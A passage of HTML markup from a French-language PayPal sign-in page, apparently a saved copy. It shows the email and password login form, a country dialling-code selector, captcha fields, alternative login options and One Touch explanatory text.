							<p class="description assure">Connectez-vous automatiquement à PayPal pour payer plus rapidement sans avoir à saisir votre mot de passe, depuis tous les appareils sur lesquels vous êtes connecté avec votre compte Google.<a href="https://www.paypal.com/signin#" id="slOptInlearnMore" class="secondayLink scTrack:unifiedlogin-sl-whatsthis" pa-marked="1">Qu'est-ce que c'est&nbsp;?</a></p>
							<p class="secondaryLink hide" id="slOptIn_notNow"><a href="https://www.paypal.com/signin#" pa-marked="1">Pas maintenant</a></p>
						</div>
						<div id="learnMoreModal" class="learnMoreModal">
							<div id="optInLearnMoreDesc" class="optInLearnMoreDesc ">
								<h1 class="headerText headerTextSpaced">Pourquoi me connecter à mon compte Google&nbsp;?</h1>
								<p> Lier votre compte Google vous permet d'activer One&nbsp;Touch™ rapidement et facilement lorsque vous payez. Vous pourrez toujours désactiver cette fonctionnalité plus tard dans vos Paramètres sur PayPal.com.</p>
								<p> Chaque fois que vous payez avec un nouvel appareil depuis un nouveau navigateur, et lorsque vous êtes connecté avec votre compte Google, vous pouvez vous connecter automatiquement au moment du paiement sans avoir à saisir votre mot de passe.</p>
							</div>
							<div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc ">
								<h1 class="headerText headerTextSpaced">Rester connecté pour des paiements plus rapides</h1>
								<p> Restez connecté sur cet appareil pour ne plus saisir votre mot de passe. Pour des raisons de sécurité, nous vous demanderons parfois de vous connecter à votre compte, y compris à chaque fois que vous mettrez à jour vos informations personnelles ou financières. Nous déconseillons d'utiliser One&nbsp;Touch™ sur des appareils partagés. Désactivez cette fonction à tout moment dans vos paramètres PayPal.</p>
							</div>
							<button type="button" class="ui-dialog-titlebar-close" pa-marked="1"></button>
						</div>
						<div class="intentFooter ">
							<div class="localeSelector  ">
								<span class="picker country-selector"><span class="hide" id="countryPickerLink">France</span><button type="button" aria-label="countryPickerLink" class="country FR" pa-marked="1"></button></span>
								<ul class="localeLink">
									<li><a class="selected scTrack:unifiedlogin-footer-language_fr_FR" href="https://www.paypal.com/signin?country.x=FR&amp;locale.x=fr_FR&amp;langTgl=fr" lang="fr" data-locale="fr_FR" aria-current="”true”" pa-marked="1">Français</a></li>
									<li><a class=" scTrack:unifiedlogin-footer-language_en_US" href="https://www.paypal.com/signin?country.x=FR&amp;locale.x=en_US&amp;langTgl=en" lang="en" data-locale="en_US" pa-marked="1">English</a></li>
								</ul>
							</div>
						</div>
					</div>
				</div>
			</section>
			<section id="login" class="login  " data-role="page" data-title="Connectez-vous à votre compte PayPal">
				<div class="corral ">
					<div id="content" class="contentContainer activeContent contentContainerBordered">
						<header id="header">
							<p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
						</header>
						<h1 id="headerText" class="headerText  accessAid">Connectez-vous à votre compte PayPal</h1>
						<p id="phoneSubTagLine" class="subHeaderText hide">Avez-vous déjà configuré votre numéro de mobile pour vous connecter&nbsp;? Saisissez-le ci-dessous. Sinon, cliquez sur le lien pour vous connecter avec une adresse email.</p>
						<p id="subTagLineConnectOtp" class="subHeaderText hide">Adresse email oubliée&nbsp;? Accédez au site PayPal pour la récupérer.</p>
						<div id="loginContent" class="">
							<div id="loginSection" class="">
								<div class="notifications"></div>
								<div id="keychainErrorMessage" class="hide">
									<p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch™ ne fonctionne qu'au moment du paiement. Connectez-vous avec votre adresse email.</p>
									<p class="notification notification-warning blocked-on-risky-login hide">Connectez-vous à l'aide de votre adresse email et de votre mot de passe.</p>
									<p class="notification notification-critical keychain-activation-failure hide">Une erreur est survenue. Connectez-vous à l'aide de votre adresse email et de votre mot de passe.</p>
								</div>
								<form action="https://www.paypal.com/signin" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate="">
									<input type="hidden" id="token" name="_csrf" value="yCh7VtraV7PiifYOFPSXdJEzbYoiz4nYjoeEA="><input type="hidden" name="locale.x" value="fr_FR"><input type="hidden" name="processSignin" value="main"><input type="hidden" name="fn_sync_data" value="fn_sync_data"><input type="hidden" name="intent" value="signin"><input type="hidden" name="ads-client-context" value="signin"><input type="hidden" name="isValidCtxId" value=""><input type="hidden" name="coBrand" value="fr"><input type="hidden" name="signUpEndPoint" value="/webapps/mpp/account-selection"><input type="hidden" name="showCountryDropDown" value="true"><input type="hidden" name="requestUrl" value="/signin"><input type="hidden" name="forcePhonePasswordOptIn" value="">
									<div class="profileDisplayName hide"></div>
									<div class="profileRememberedEmail  hide "><span class="profileDisplayPhoneCode" dir="ltr"></span><span class="profileDisplayEmail notranslate"></span><a href="https://www.paypal.com/signin#" class="notYouLink scTrack:not-you" id="backToInputEmailLink" pa-marked="1">Modifier</a></div>
									<div id="splitEmail" class="splitEmail ">
										<div id="splitEmailSection" class="splitPhoneSection splitEmailSection adjustSection">
											<div class="countryPhoneSelectWrapper hide">
												<label class="accessAid" for="phoneCode">Choisir l'indicatif téléphonique de votre pays</label>
												<select name="phoneCode" id="phoneCode" class="countryPhoneSelect">
													<option value="ZA +27" data-code="+27" data-country="ZA">Afrique du Sud (+27)</option>
													<option value="AL +355" data-code="+355" data-country="AL">Albanie (+355)</option>
													<option value="DZ +213" data-code="+213" data-country="DZ">Algérie (+213)</option>
													<option value="DE +49" data-code="+49" data-country="DE">Allemagne (+49)</option>
													<option value="AD +376" data-code="+376" data-country="AD">Andorre (+376)</option>
													<option value="AO +244" data-code="+244" data-country="AO">Angola (+244)</option>
													<option value="AI +1" data-code="+1" data-country="AI">Anguilla (+1)</option>
													<option value="AG +1" data-code="+1" data-country="AG">Antigua-et-Barbuda (+1)</option>
													<option value="AN +599" data-code="+599" data-country="AN">Antilles néerlandaises (+599)</option>
													<option value="SA +966" data-code="+966" data-country="SA">Arabie saoudite (+966)</option>
													<option value="AR +54" data-code="+54" data-country="AR">Argentine (+54)</option>
													<option value="AM +374" data-code="+374" data-country="AM">Arménie (+374)</option>
													<option value="AW +297" data-code="+297" data-country="AW">Aruba (+297)</option>
													<option value="AU +61" data-code="+61" data-country="AU">Australie (+61)</option>
													<option value="AT +43" data-code="+43" data-country="AT">Autriche (+43)</option>
													<option value="AZ +994" data-code="+994" data-country="AZ">Azerbaïdjan (+994)</option>
													<option value="BS +1" data-code="+1" data-country="BS">Bahamas (+1)</option>
													<option value="BH +973" data-code="+973" data-country="BH">Bahreïn (+973)</option>
													<option value="BB +1" data-code="+1" data-country="BB">Barbade (+1)</option>
													<option value="BE +32" data-code="+32" data-country="BE">Belgique (+32)</option>
													<option value="BZ +501" data-code="+501" data-country="BZ">Belize (+501)</option>
													<option value="BJ +229" data-code="+229" data-country="BJ">Bénin (+229)</option>
													<option value="BM +1" data-code="+1" data-country="BM">Bermudes (+1)</option>
													<option value="BT +975" data-code="+975" data-country="BT">Bhoutan (+975)</option>
													<option value="BY +375" data-code="+375" data-country="BY">Biélorussie (+375)</option>
													<option value="BO +591" data-code="+591" data-country="BO">Bolivie (+591)</option>
													<option value="BA +387" data-code="+387" data-country="BA">Bosnie-Herzégovine (+387)</option>
													<option value="BW +267" data-code="+267" data-country="BW">Botswana (+267)</option>
													<option value="BR +55" data-code="+55" data-country="BR">Brésil (+55)</option>
													<option value="BN +673" data-code="+673" data-country="BN">Brunéi Darussalam (+673)</option>
													<option value="BG +359" data-code="+359" data-country="BG">Bulgarie (+359)</option>
													<option value="BF +226" data-code="+226" data-country="BF">Burkina Faso (+226)</option>
													<option value="BI +257" data-code="+257" data-country="BI">Burundi (+257)</option>
													<option value="KH +855" data-code="+855" data-country="KH">Cambodge (+855)</option>
													<option value="CM +237" data-code="+237" data-country="CM">Cameroun (+237)</option>
													<option value="CA +1" data-code="+1" data-country="CA">Canada (+1)</option>
													<option value="CV +238" data-code="+238" data-country="CV">Cap-Vert (+238)</option>
													<option value="CL +56" data-code="+56" data-country="CL">Chili (+56)</option>
													<option value="CN +86" data-code="+86" data-country="CN">Chine (+86)</option>
													<option value="CY +357" data-code="+357" data-country="CY">Chypre (+357)</option>
													<option value="CO +57" data-code="+57" data-country="CO">Colombie (+57)</option>
													<option value="KM +269" data-code="+269" data-country="KM">Comores (+269)</option>
													<option value="CG +242" data-code="+242" data-country="CG">Congo-Brazzaville (+242)</option>
													<option value="CD +243" data-code="+243" data-country="CD">Congo-Kinshasa (+243)</option>
													<option value="KR +82" data-code="+82" data-country="KR">Corée du Sud (+82)</option>
													<option value="CR +506" data-code="+506" data-country="CR">Costa Rica (+506)</option>
													<option value="CI +225" data-code="+225" data-country="CI">Côte d’Ivoire (+225)</option>
													<option value="HR +385" data-code="+385" data-country="HR">Croatie (+385)</option>
													<option value="DK +45" data-code="+45" data-country="DK">Danemark (+45)</option>
													<option value="DJ +253" data-code="+253" data-country="DJ">Djibouti (+253)</option>
													<option value="DM +1" data-code="+1" data-country="DM">Dominique (+1)</option>
													<option value="EG +20" data-code="+20" data-country="EG">Égypte (+20)</option>
													<option value="SV +503" data-code="+503" data-country="SV">El Salvador (+503)</option>
													<option value="AE +971" data-code="+971" data-country="AE">Émirats arabes unis (+971)</option>
													<option value="EC +593" data-code="+593" data-country="EC">Équateur (+593)</option>
													<option value="ER +291" data-code="+291" data-country="ER">Érythrée (+291)</option>
													<option value="ES +34" data-code="+34" data-country="ES">Espagne (+34)</option>
													<option value="EE +372" data-code="+372" data-country="EE">Estonie (+372)</option>
													<option value="VA +39" data-code="+39" data-country="VA">État de la Cité du Vatican (+39)</option>
													<option value="FM +691" data-code="+691" data-country="FM">États fédérés de Micronésie (+691)</option>
													<option value="US +1" data-code="+1" data-country="US">États-Unis (+1)</option>
													<option value="ET +251" data-code="+251" data-country="ET">Éthiopie (+251)</option>
													<option value="FJ +679" data-code="+679" data-country="FJ">Fidji (+679)</option>
													<option value="FI +358" data-code="+358" data-country="FI">Finlande (+358)</option>
													<option value="FR +33" data-code="+33" data-country="FR" selected="selected">France (+33)</option>
													<option value="GA +241" data-code="+241" data-country="GA">Gabon (+241)</option>
													<option value="GM +220" data-code="+220" data-country="GM">Gambie (+220)</option>
													<option value="GE +995" data-code="+995" data-country="GE">Géorgie (+995)</option>
													<option value="GI +350" data-code="+350" data-country="GI">Gibraltar (+350)</option>
													<option value="GR +30" data-code="+30" data-country="GR">Grèce (+30)</option>
													<option value="GD +1" data-code="+1" data-country="GD">Grenade (+1)</option>
													<option value="GL +299" data-code="+299" data-country="GL">Groenland (+299)</option>
													<option value="GP +590" data-code="+590" data-country="GP">Guadeloupe (+590)</option>
													<option value="GT +502" data-code="+502" data-country="GT">Guatemala (+502)</option>
													<option value="GN +224" data-code="+224" data-country="GN">Guinée (+224)</option>
													<option value="GW +245" data-code="+245" data-country="GW">Guinée-Bissau (+245)</option>
													<option value="GY +592" data-code="+592" data-country="GY">Guyana (+592)</option>
													<option value="GF +594" data-code="+594" data-country="GF">Guyane française (+594)</option>
													<option value="HN +504" data-code="+504" data-country="HN">Honduras (+504)</option>
													<option value="HU +36" data-code="+36" data-country="HU">Hongrie (+36)</option>
													<option value="NF +672" data-code="+672" data-country="NF">Île Norfolk (+672)</option>
													<option value="KY +1" data-code="+1" data-country="KY">Îles Caïmans (+1)</option>
													<option value="CK +682" data-code="+682" data-country="CK">Îles Cook (+682)</option>
													<option value="FO +298" data-code="+298" data-country="FO">Îles Féroé (+298)</option>
													<option value="FK +500" data-code="+500" data-country="FK">Îles Malouines (+500)</option>
													<option value="MH +692" data-code="+692" data-country="MH">Îles Marshall (+692)</option>
													<option value="PN +64" data-code="+64" data-country="PN">Îles Pitcairn (+64)</option>
													<option value="SB +677" data-code="+677" data-country="SB">Îles Salomon (+677)</option>
													<option value="TC +1" data-code="+1" data-country="TC">Îles Turques-et-Caïques (+1)</option>
													<option value="VG +1" data-code="+1" data-country="VG">Îles Vierges britanniques (+1)</option>
													<option value="IN +91" data-code="+91" data-country="IN">Inde (+91)</option>
													<option value="ID +62" data-code="+62" data-country="ID">Indonésie (+62)</option>
													<option value="IE +353" data-code="+353" data-country="IE">Irlande (+353)</option>
													<option value="IS +354" data-code="+354" data-country="IS">Islande (+354)</option>
													<option value="IL +972" data-code="+972" data-country="IL">Israël (+972)</option>
													<option value="IT +39" data-code="+39" data-country="IT">Italie (+39)</option>
													<option value="JM +1" data-code="+1" data-country="JM">Jamaïque (+1)</option>
													<option value="JP +81" data-code="+81" data-country="JP">Japon (+81)</option>
													<option value="JO +962" data-code="+962" data-country="JO">Jordanie (+962)</option>
													<option value="KZ +7" data-code="+7" data-country="KZ">Kazakhstan (+7)</option>
													<option value="KE +254" data-code="+254" data-country="KE">Kenya (+254)</option>
													<option value="KG +996" data-code="+996" data-country="KG">Kirghizistan (+996)</option>
													<option value="KI +686" data-code="+686" data-country="KI">Kiribati (+686)</option>
													<option value="KW +965" data-code="+965" data-country="KW">Koweït (+965)</option>
													<option value="RE +262" data-code="+262" data-country="RE">La Réunion (+262)</option>
													<option value="LA +856" data-code="+856" data-country="LA">Laos (+856)</option>
													<option value="LS +266" data-code="+266" data-country="LS">Lesotho (+266)</option>
													<option value="LV +371" data-code="+371" data-country="LV">Lettonie (+371)</option>
													<option value="LI +423" data-code="+423" data-country="LI">Liechtenstein (+423)</option>
													<option value="LT +370" data-code="+370" data-country="LT">Lituanie (+370)</option>
													<option value="LU +352" data-code="+352" data-country="LU">Luxembourg (+352)</option>
													<option value="MK +389" data-code="+389" data-country="MK">Macédoine (+389)</option>
													<option value="MG +261" data-code="+261" data-country="MG">Madagascar (+261)</option>
													<option value="MY +60" data-code="+60" data-country="MY">Malaisie (+60)</option>
													<option value="MW +265" data-code="+265" data-country="MW">Malawi (+265)</option>
													<option value="MV +960" data-code="+960" data-country="MV">Maldives (+960)</option>
													<option value="ML +223" data-code="+223" data-country="ML">Mali (+223)</option>
													<option value="MT +356" data-code="+356" data-country="MT">Malte (+356)</option>
													<option value="MA +212" data-code="+212" data-country="MA">Maroc (+212)</option>
													<option value="MQ +596" data-code="+596" data-country="MQ">Martinique (+596)</option>
													<option value="MU +230" data-code="+230" data-country="MU">Maurice (+230)</option>
													<option value="MR +222" data-code="+222" data-country="MR">Mauritanie (+222)</option>
													<option value="YT +262" data-code="+262" data-country="YT">Mayotte (+262)</option>
													<option value="MX +52" data-code="+52" data-country="MX">Mexique (+52)</option>
													<option value="MD +373" data-code="+373" data-country="MD">Moldavie (+373)</option>
													<option value="MC +377" data-code="+377" data-country="MC">Monaco (+377)</option>
													<option value="MN +976" data-code="+976" data-country="MN">Mongolie (+976)</option>
													<option value="ME +382" data-code="+382" data-country="ME">Monténégro (+382)</option>
													<option value="MS +1" data-code="+1" data-country="MS">Montserrat (+1)</option>
													<option value="MZ +258" data-code="+258" data-country="MZ">Mozambique (+258)</option>
													<option value="NA +264" data-code="+264" data-country="NA">Namibie (+264)</option>
													<option value="NR +674" data-code="+674" data-country="NR">Nauru (+674)</option>
													<option value="NP +977" data-code="+977" data-country="NP">Népal (+977)</option>
													<option value="NI +505" data-code="+505" data-country="NI">Nicaragua (+505)</option>
													<option value="NE +227" data-code="+227" data-country="NE">Niger (+227)</option>
													<option value="NG +234" data-code="+234" data-country="NG">Nigéria (+234)</option>
													<option value="NU +683" data-code="+683" data-country="NU">Niue (+683)</option>
													<option value="NO +47" data-code="+47" data-country="NO">Norvège (+47)</option>
													<option value="NC +687" data-code="+687" data-country="NC">Nouvelle-Calédonie (+687)</option>
													<option value="NZ +64" data-code="+64" data-country="NZ">Nouvelle-Zélande (+64)</option>
													<option value="OM +968" data-code="+968" data-country="OM">Oman (+968)</option>
													<option value="UG +256" data-code="+256" data-country="UG">Ouganda (+256)</option>
													<option value="PW +680" data-code="+680" data-country="PW">Palaos (+680)</option>
													<option value="PA +507" data-code="+507" data-country="PA">Panama (+507)</option>
													<option value="PG +675" data-code="+675" data-country="PG">Papouasie-Nouvelle-Guinée (+675)</option>
													<option value="PY +595" data-code="+595" data-country="PY">Paraguay (+595)</option>
													<option value="NL +31" data-code="+31" data-country="NL">Pays-Bas (+31)</option>
													<option value="PE +51" data-code="+51" data-country="PE">Pérou (+51)</option>
													<option value="PH +63" data-code="+63" data-country="PH">Philippines (+63)</option>
													<option value="PL +48" data-code="+48" data-country="PL">Pologne (+48)</option>
													<option value="PF +689" data-code="+689" data-country="PF">Polynésie française (+689)</option>
													<option value="PT +351" data-code="+351" data-country="PT">Portugal (+351)</option>
													<option value="QA +974" data-code="+974" data-country="QA">Qatar (+974)</option>
													<option value="HK +852" data-code="+852" data-country="HK">R.A.S. chinoise de Hong Kong (+852)</option>
													<option value="DO +1" data-code="+1" data-country="DO">République dominicaine (+1)</option>
													<option value="CZ +420" data-code="+420" data-country="CZ">République tchèque (+420)</option>
													<option value="RO +40" data-code="+40" data-country="RO">Roumanie (+40)</option>
													<option value="GB +44" data-code="+44" data-country="GB">Royaume-Uni (+44)</option>
													<option value="RU +7" data-code="+7" data-country="RU">Russie (+7)</option>
													<option value="RW +250" data-code="+250" data-country="RW">Rwanda (+250)</option>
													<option value="KN +1" data-code="+1" data-country="KN">Saint-Christophe-et-Niévès (+1)</option>
													<option value="SM +378" data-code="+378" data-country="SM">Saint-Marin (+378)</option>
													<option value="PM +508" data-code="+508" data-country="PM">Saint-Pierre-et-Miquelon (+508)</option>
													<option value="VC +1" data-code="+1" data-country="VC">Saint-Vincent-et-les-Grenadines (+1)</option>
													<option value="SH +290" data-code="+290" data-country="SH">Sainte-Hélène (+290)</option>
													<option value="LC +1" data-code="+1" data-country="LC">Sainte-Lucie (+1)</option>
													<option value="WS +685" data-code="+685" data-country="WS">Samoa (+685)</option>
													<option value="ST +239" data-code="+239" data-country="ST">Sao Tomé-et-Principe (+239)</option>
													<option value="SN +221" data-code="+221" data-country="SN">Sénégal (+221)</option>
													<option value="RS +381" data-code="+381" data-country="RS">Serbie (+381)</option>
													<option value="SC +248" data-code="+248" data-country="SC">Seychelles (+248)</option>
													<option value="SL +232" data-code="+232" data-country="SL">Sierra Leone (+232)</option>
													<option value="SG +65" data-code="+65" data-country="SG">Singapour (+65)</option>
													<option value="SK +421" data-code="+421" data-country="SK">Slovaquie (+421)</option>
													<option value="SI +386" data-code="+386" data-country="SI">Slovénie (+386)</option>
													<option value="SO +252" data-code="+252" data-country="SO">Somalie (+252)</option>
													<option value="LK +94" data-code="+94" data-country="LK">Sri Lanka (+94)</option>
													<option value="SE +46" data-code="+46" data-country="SE">Suède (+46)</option>
													<option value="CH +41" data-code="+41" data-country="CH">Suisse (+41)</option>
													<option value="SR +597" data-code="+597" data-country="SR">Suriname (+597)</option>
													<option value="SJ +47" data-code="+47" data-country="SJ">Svalbard et Jan Mayen (+47)</option>
													<option value="SZ +268" data-code="+268" data-country="SZ">Swaziland (+268)</option>
													<option value="TJ +992" data-code="+992" data-country="TJ">Tadjikistan (+992)</option>
													<option value="TW +886" data-code="+886" data-country="TW">Taïwan (+886)</option>
													<option value="TZ +255" data-code="+255" data-country="TZ">Tanzanie (+255)</option>
													<option value="TD +235" data-code="+235" data-country="TD">Tchad (+235)</option>
													<option value="TH +66" data-code="+66" data-country="TH">Thaïlande (+66)</option>
													<option value="TG +228" data-code="+228" data-country="TG">Togo (+228)</option>
													<option value="TO +676" data-code="+676" data-country="TO">Tonga (+676)</option>
													<option value="TT +1" data-code="+1" data-country="TT">Trinité-et-Tobago (+1)</option>
													<option value="TN +216" data-code="+216" data-country="TN">Tunisie (+216)</option>
													<option value="TM +993" data-code="+993" data-country="TM">Turkménistan (+993)</option>
													<option value="TR +90" data-code="+90" data-country="TR">Turquie (+90)</option>
													<option value="TV +688" data-code="+688" data-country="TV">Tuvalu (+688)</option>
													<option value="UA +380" data-code="+380" data-country="UA">Ukraine (+380)</option>
													<option value="UY +598" data-code="+598" data-country="UY">Uruguay (+598)</option>
													<option value="VU +678" data-code="+678" data-country="VU">Vanuatu (+678)</option>
													<option value="VE +58" data-code="+58" data-country="VE">Venezuela (+58)</option>
													<option value="VN +84" data-code="+84" data-country="VN">Vietnam (+84)</option>
													<option value="WF +681" data-code="+681" data-country="WF">Wallis-et-Futuna (+681)</option>
													<option value="YE +967" data-code="+967" data-country="YE">Yémen (+967)</option>
													<option value="ZM +260" data-code="+260" data-country="ZM">Zambie (+260)</option>
													<option value="ZW +263" data-code="+263" data-country="ZW">Zimbabwe (+263)</option>
												</select>
												<div class="countryPhoneSelectChoice"><span class="countryCode">FR</span><span class="phoneCode">+33</span></div>
											</div>
											<div class="textInput " id="login_emaildiv">
												<div class="fieldWrapper"><input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="username" placeholder="Email ou numéro de mobile" aria-describedby="emailErrorMessage"><label for="email" class="fieldLabel">Email ou numéro de mobile</label></div>
												<div class="errorMessage" id="emailErrorMessage">
													<p class="emptyError hide">Obligatoire</p>
													<p class="invalidError hide">Le format de cette adresse email ou de ce numéro de mobile n'est pas correct</p>
												</div>
											</div>
											<a href="https://www.paypal.com/authflow/email-recovery/?contextId=&amp;redirectUri=%252Fsignin" id="forgotEmail" class="recoveryOption" data-client-log-action-type="clickForgotEmailLink" pa-marked="1">Adresse email oubliée&nbsp;?</a>	
											<div class="captcha captcha-container clearfix hide" id="splitHybridCaptcha">
												<div class="captcha-image"><img src="https://www.paypal.com/signin" alt=""></div>
												<div class="captcha-inputs clearfix">
													<div class="textInput ">
														<div class="fieldWrapper"><input id="splitHybridCaptcha" name="captchaCode" type="text" class="hasHelp  validateEmpty   " value="" autocomplete="off" placeholder="Entrer le code" aria-describedby="captchaErrorMessage"><label for="splitHybridCaptcha" class="fieldLabel"></label></div>
														<div class="errorMessage" id="captchaErrorMessage">
															<p class="emptyError hide">Obligatoire</p>
														</div>
													</div>
													<div class="refresh"><a href="https://www.paypal.com/signin" class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" pa-marked="1"><span class="accessAid">Actualiser l'image</span></a></div>
													<div class="audio">
														<audio role="application" id="captchaPlayer" src="" class="hide"></audio>
														<a target="_blank" href="https://www.paypal.com/signin" class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" pa-marked="1"><span class="accessAid">Bouton audio</span></a>
													</div>
												</div>
											</div>
										</div>
										<div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1">Suivant</button></div>
										<div class="tpdDemo hide" id="tpdDemo">
											<p class="tpdDemoContent">Connectez-vous, comme d'habitude, avec votre adresse email. Vous serez ensuite invité à vous connecter avec les données biométriques de votre téléphone.</p>
										</div>
										<input type="hidden" id="phone" name="login_phone" value="" class="validate">
									</div>
									<input type="hidden" name="initialSplitLoginContext" id="initialSplitLoginContext" value="inputEmail"><input type="hidden" name="isTpdOnboarded" id="isTpdOnboarded" value="">
									<div id="splitPassword" class="splitPassword  enable-autofill hide">
										<div id="splitPasswordSection" class="hide enable-autofill">
											<div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
												<div class="textInput " id="login_passworddiv">
													<div class="fieldWrapper"><input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Mot de passe" aria-describedby="passwordErrorMessage"><label for="password" class="fieldLabel">Mot de passe</label><label for="Afficher le mot de passe" class="fieldLabel">Afficher le mot de passe</label><button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Afficher le mot de passe" pa-marked="1">Afficher</button><label for="Masquer" class="fieldLabel">Masquer</label><button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Masquer" pa-marked="1">Masquer</button></div>
													<div class="errorMessage" id="passwordErrorMessage">
														<p class="emptyError hide">Obligatoire.</p>
													</div>
												</div>
												<a href="https://www.paypal.com/authflow/password-recovery/?country.x=FR&amp;locale.x=fr_FR&amp;redirectUri=%252Fsignin" id="setupPassword" class="recoveryOption forgotPassword hide" data-client-log-action-type="clickSetupPasswordLink" pa-marked="1">Configurer un mot de passe</a><a href="https://www.paypal.com/authflow/password-recovery/?country.x=FR&amp;locale.x=fr_FR&amp;redirectUri=%252Fsignin" id="forgotPassword" class="recoveryOption forgotPassword " data-client-log-action-type="clickForgotPasswordLink" pa-marked="1">Mot de passe oublié&nbsp;?</a>
											</div>
										</div>
										<div class="captcha captcha-container clearfix hide" id="splitPasswordCaptcha">
											<div class="captcha-image"><img src="https://www.paypal.com/signin" alt=""></div>
											<div class="captcha-inputs clearfix">
												<div class="textInput ">
													<div class="fieldWrapper"><input id="splitPasswordCaptcha" name="captcha" type="text" class="hasHelp  validateEmpty   " value="" autocomplete="off" placeholder="Entrer le code" aria-describedby="captchaErrorMessage"><label for="splitPasswordCaptcha" class="fieldLabel"></label></div>
													<div class="errorMessage" id="captchaErrorMessage">
														<p class="emptyError hide">Obligatoire</p>
													</div>
												</div>
												<div class="refresh"><a href="https://www.paypal.com/signin" class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" pa-marked="1"><span class="accessAid">Actualiser l'image</span></a></div>
												<div class="audio">
													<audio role="application" id="captchaPlayer" src="" class="hide"></audio>
													<a target="_blank" href="https://www.paypal.com/signin" class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" pa-marked="1"><span class="accessAid">Bouton audio</span></a>
												</div>
											</div>
										</div>
										<div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Connexion</button></div>
									</div>
									<input type="hidden" name="splitLoginContext" value="inputEmail">
								</form>
								<div class="moreOptionsDiv  hide" id="moreOptionsContainer">
									<a href="https://www.paypal.com/signin#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">Encore plus d'options</a>
									<div class="bubble-tooltip hide" id="moreOptionsDropDown">
										<ul class="moreoptionsGroup">
											<li><a href="https://www.paypal.com/signin#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile" pa-marked="1">Approuvez la connexion avec l’appareil mobile.</a></li>
											<li><a href="https://www.paypal.com/authflow/password-recovery/?country.x=FR&amp;locale.x=fr_FR&amp;redirectUri=%252Fsignin" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Vous n'arrivez pas à vous connecter&nbsp;?</a></li>
										</ul>
									</div>
								</div>
								<div id="tryAnotherWayLinkContainer" class="tryAnotherWayLinkContainer hide" data-hide-on-pass=""><a href="https://www.paypal.com/signin#" id="tryAnotherWayLink" pa-marked="1">Choisir une autre méthode</a></div>
								<div id="signupContainer" class="signupContainer " data-hide-on-email="" data-hide-on-pass="">
									<div class="loginSignUpSeparator "><span class="textInSeparator">ou</span></div>
									<button type="button" href="/fr/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Ouvrir un compte</button>
								</div>
								<div id="tpdButtonContainer" class="signupContainer hide">
									<div class="loginSignUpSeparator"><span class="textInSeparator">ou</span></div>
									<div class="actions"><button class="button secondary" id="tpdButton" type="submit" value="Approuvez la connexion avec l’appareil mobile." pa-marked="1">Approuvez la connexion avec l’appareil mobile.</button></div>
								</div>
							</div>
						</div>
						<div class="intentFooter ">
							<div class="localeSelector  ">
								<span class="picker country-selector"><span class="hide" id="countryPickerLink">France</span><button type="button" aria-label="countryPickerLink" class="country FR" pa-marked="1"></button></span>
								<ul class="localeLink">
									<li><a class="selected scTrack:unifiedlogin-footer-language_fr_FR" href="https://www.paypal.com/signin?country.x=FR&amp;locale.x=fr_FR&amp;langTgl=fr" lang="fr" data-locale="fr_FR" aria-current="”true”" pa-marked="1">Français</a></li>
									<li><a class=" scTrack:unifiedlogin-footer-language_en_US" href="https://www.paypal.com/signin?country.x=FR&amp;locale.x=en_US&amp;langTgl=en" lang="en" data-locale="en_US" pa-marked="1">English</a></li>
								</ul>
							</div>
						</div>
					</div>
				</div>
				<div id="tryAnotherWayModal" class="tryAnotherWayModal hide">
					<div class="modal-content">
						<div class="modal-content-header">
							<div class="modal-header-text">Choisir une autre méthode</div>
							<div><button id="closeModal" type="button" class="dialog-close" aria-label="dialog-close-btn" pa-marked="1"></button></div>
						</div>
						<ul class="modal-content-body">
							<li class="hide">
								<a aria-label="Login with Touch ID or Face ID" id="loginWithWebauthn" href="https://www.paypal.com/signin#" pa-marked="1">
									<div>Connectez-vous avec votre visage, empreinte digitale ou code</div>
									<button class="chevron-right" aria-label="webauthn-chevron" pa-marked="1"></button>
								</a>
							</li>
							<li class="hide">
								<a aria-label="Login with phone one-time code" id="loginWithOtp" href="https://www.paypal.com/signin#" pa-marked="1">
									<div>Envoyer un code à usage unique par SMS</div>
									<button class="chevron-right" aria-label="phone-otc-chevron" pa-marked="1"></button>
								</a>
							</li>
							<li class="hide">
								<a aria-label="Login with email one-time code" id="loginWithEmailOtp" href="https://www.paypal.com/signin#" pa-marked="1">
									<div>Envoyer un code à usage unique par email</div>
									<button class="chevron-right" aria-label="email-otc-chevron" pa-marked="1"></button>
								</a>
							</li>
							<li class="hide">
								<a aria-label="Login with password" id="loginWithPassword" href="https://www.paypal.com/signin#" pa-marked="1">
									<div>Connexion par mot de passe</div>
									<button class="chevron-right" aria-label="pwd-chevron" pa-marked="1"></button>
								</a>
							</li>
						</ul>
					</div>
				</div>
			</section>
			<section id="verification" class="verification hide" data-role="page" data-title="Confirmation de connexion - PayPal">
				<div class="corral">
					<div class="contentContainer contentContainerLean">
						<div id="pending" class="verificationSubSection">
							<h1 class="headerText">Ouvrir l'application PayPal</h1>
							<p id="uncookiedMessage" class="verification-message hide">Ouvrez l'application PayPal, appuyez sur Oui lorsque vous y êtes invité, puis saisissez <span class="twoDigitPin">{twoDigitPin}</span> sur votre téléphone pour vous connecter.</p>
